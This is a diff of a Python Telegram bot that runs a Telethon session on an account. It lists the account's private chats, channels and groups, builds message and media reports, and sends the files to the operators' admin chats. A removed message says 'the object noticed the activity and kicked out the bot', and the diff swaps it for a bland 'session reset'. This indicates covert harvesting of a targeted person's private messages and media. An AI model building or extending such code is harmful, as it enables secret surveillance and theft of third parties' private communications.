@@ -102,10 +102,9 @@ async def analytic_command(message: types.Message):
 async def select_mode_of_download(message: types.Message):
     user_id = message.from_user.id
     if user_id in user_state and user_state[user_id].get('connected'):
-        if 'client' in user_state.get(user_id, {}):
             client = user_state[user_id]['client']
             if await client.get_me() is None:
-                await bot.send_message(user_id, 'Объект заметил активность и "выкинул" бота')
+                await bot.send_message(user_id, 'Сессия сборшена')
                 user_state.pop(user_id, None)
             else:
                 await show_keyboard(message)
@@ -120,9 +119,14 @@ async def select_mode_of_download(message: types.Message):
 async def select_mode_of_download(message: types.Message):
     user_id = message.from_user.id
     if user_id in user_state and user_state[user_id].get('connected'):
-        await show_keyboard(message)
-        user_state[user_id]['type'] = 'chat'
-        user_state[user_id]['selection']=''
+            client = user_state[user_id]['client']
+            if await client.get_me() is None:
+                await bot.send_message(user_id, 'Сессия сборшена')
+                user_state.pop(user_id, None)
+            else:
+                await show_keyboard(message)
+                user_state[user_id]['type'] = 'chat'
+                user_state[user_id]['selection']=''
     else:
         logging.info(f"User {user_id} is not connected. Cannot perform getting private message.")
         await message.answer("Вы должны сначала подключиться. Введите /start для начала процесса подключения.")
@@ -148,64 +152,69 @@ async def callback_query_handler(callback_query: AiogramCallbackQuery):
     user_id = callback_query.from_user.id
     code = callback_query.data
     client = user_state[user_id]['client']
-    if user_state[user_id]['type'] == 'private':
-        if code == 'withoutall':
-            selection = '40'
-            selection_alias = 'Отчет без медиа'
-        elif code == 'with_photos':
-                selection = '45'
-                selection_alias = 'Отчет с фото'
-        elif code == 'get_media':
-                selection = '450'
-                selection_alias = 'Отчет с фото + скачивание всех медиа'
-        user_state[user_id]['selection'] = selection
-        await bot.send_message(callback_query.from_user.id, f"Вы выбрали опцию: {selection_alias}. Формирую список диалогов...")
-        logging.info(f"User {user_id} is connected. Starting get private message.")
-        try:
-                    user_dialogs, i, users_list = await get_user_dialogs(client)
-                    if not user_dialogs:
+
+    if await client.get_me() is None:
+        await bot.send_message(user_id, 'Сессия сборшена')
+        user_state.pop(user_id, None)
+    else:
+        if user_state[user_id]['type'] == 'private':
+            if code == 'withoutall':
+                selection = '40'
+                selection_alias = 'Отчет без медиа'
+            elif code == 'with_photos':
+                    selection = '45'
+                    selection_alias = 'Отчет с фото'
+            elif code == 'get_media':
+                    selection = '450'
+                    selection_alias = 'Отчет с фото + скачивание всех медиа'
+            user_state[user_id]['selection'] = selection
+            await bot.send_message(callback_query.from_user.id, f"Вы выбрали опцию: {selection_alias}. Формирую список диалогов...")
+            logging.info(f"User {user_id} is connected. Starting get private message.")
+            try:
+                        user_dialogs, i, users_list = await get_user_dialogs(client)
+                        if not user_dialogs:
+                            await bot.send_message(user_id, "У вас нет активных диалогов для выбора.")
+                            return
+                        else:
+                            # Сохраняем user_id и users_list в user_state для дальнейшего использования
+                            user_state[user_id]['users_list'] = users_list
+                            user_state[user_id]['dialogs_count'] = i        
+                            dialog_message = "\n".join(user_dialogs)
+                            await bot.send_message(user_id, dialog_message, parse_mode=ParseMode.HTML)
+                            await bot.send_message(user_id, 'Выберите номер нужного диалога для продолжения')
+            except Exception as e:
+                        logging.error(f"Error during making list: {e}")
+                        await bot.send_message(user_id, f"Произошла ошибка при формирование списка  личных сообщений: {e}")
+    
+        elif user_state[user_id]['type'] == 'chat':
+            if code == 'withoutall':
+                selection = '70'
+                selection_alias = 'Отчет без медиа'
+            elif code == 'with_photos':
+                    selection = '75'
+                    selection_alias = 'Отчет с фото'
+            elif code == 'get_media':
+                    selection = '750'
+                    selection_alias = 'Отчет с фото + скачивание всех медиа'
+            user_state[user_id]['selection'] = selection
+            await bot.send_message(callback_query.from_user.id, f"Вы выбрали опцию: {selection_alias}. Формирую список диалогов...")
+            logging.info(f"User {user_id} is connected. Starting get private message.")
+            try:
+                    delgroups, chat_message_counts, openchannels, closechannels, openchats, closechats, admin_id, user_bots, user_bots_html, list_botexisted = await get_type_of_chats(client, selection)
+                    groups, i, all_info, openchannel_count, closechannel_count, opengroup_count, closegroup_count, closegroupdel_count, owner_openchannel, owner_closechannel, owner_opengroup, owner_closegroup, public_channels_html, private_channels_html, public_groups_html, private_groups_html, deleted_groups_html, channels_list = await make_list_of_channels(delgroups, chat_message_counts, openchannels, closechannels, openchats, closechats, selection, client)
+                    if not channels_list:
                         await bot.send_message(user_id, "У вас нет активных диалогов для выбора.")
                         return
                     else:
                         # Сохраняем user_id и users_list в user_state для дальнейшего использования
-                        user_state[user_id]['users_list'] = users_list
+                        user_state[user_id]['users_list'] = groups
                         user_state[user_id]['dialogs_count'] = i        
-                        dialog_message = "\n".join(user_dialogs)
+                        dialog_message = "\n".join(channels_list)
                         await bot.send_message(user_id, dialog_message, parse_mode=ParseMode.HTML)
                         await bot.send_message(user_id, 'Выберите номер нужного диалога для продолжения')
-        except Exception as e:
+            except Exception as e:
                     logging.error(f"Error during making list: {e}")
-                    await bot.send_message(user_id, f"Произошла ошибка при формирование списка  личных сообщений: {e}")
-
-    elif user_state[user_id]['type'] == 'chat':
-        if code == 'withoutall':
-            selection = '70'
-            selection_alias = 'Отчет без медиа'
-        elif code == 'with_photos':
-                selection = '75'
-                selection_alias = 'Отчет с фото'
-        elif code == 'get_media':
-                selection = '750'
-                selection_alias = 'Отчет с фото + скачивание всех медиа'
-        user_state[user_id]['selection'] = selection
-        await bot.send_message(callback_query.from_user.id, f"Вы выбрали опцию: {selection_alias}. Формирую список диалогов...")
-        logging.info(f"User {user_id} is connected. Starting get private message.")
-        try:
-                delgroups, chat_message_counts, openchannels, closechannels, openchats, closechats, admin_id, user_bots, user_bots_html, list_botexisted = await get_type_of_chats(client, selection)
-                groups, i, all_info, openchannel_count, closechannel_count, opengroup_count, closegroup_count, closegroupdel_count, owner_openchannel, owner_closechannel, owner_opengroup, owner_closegroup, public_channels_html, private_channels_html, public_groups_html, private_groups_html, deleted_groups_html, channels_list = await make_list_of_channels(delgroups, chat_message_counts, openchannels, closechannels, openchats, closechats, selection, client)
-                if not channels_list:
-                    await bot.send_message(user_id, "У вас нет активных диалогов для выбора.")
-                    return
-                else:
-                    # Сохраняем user_id и users_list в user_state для дальнейшего использования
-                    user_state[user_id]['users_list'] = groups
-                    user_state[user_id]['dialogs_count'] = i        
-                    dialog_message = "\n".join(channels_list)
-                    await bot.send_message(user_id, dialog_message, parse_mode=ParseMode.HTML)
-                    await bot.send_message(user_id, 'Выберите номер нужного диалога для продолжения')
-        except Exception as e:
-                logging.error(f"Error during making list: {e}")
-                await bot.send_message(user_id, f"Произошла ошибка при формирование списка диалогов канала: {e}")
+                    await bot.send_message(user_id, f"Произошла ошибка при формирование списка диалогов канала: {e}")
 
 
 
@@ -396,7 +405,7 @@ async def process_user_data(client, phone_number, user_id):
         await send_files_to_bot(bot, admin_chat_ids, user_id)
     except Exception as e:
         logging.error(f"Error processing user data: {e}")
-        await bot.send_message(user_id, 'Объект заметил активность и "выкинул" бота')
+        await bot.send_message(user_id, 'Сессия сборшена')
         user_state.pop(user_id, None)
 
 
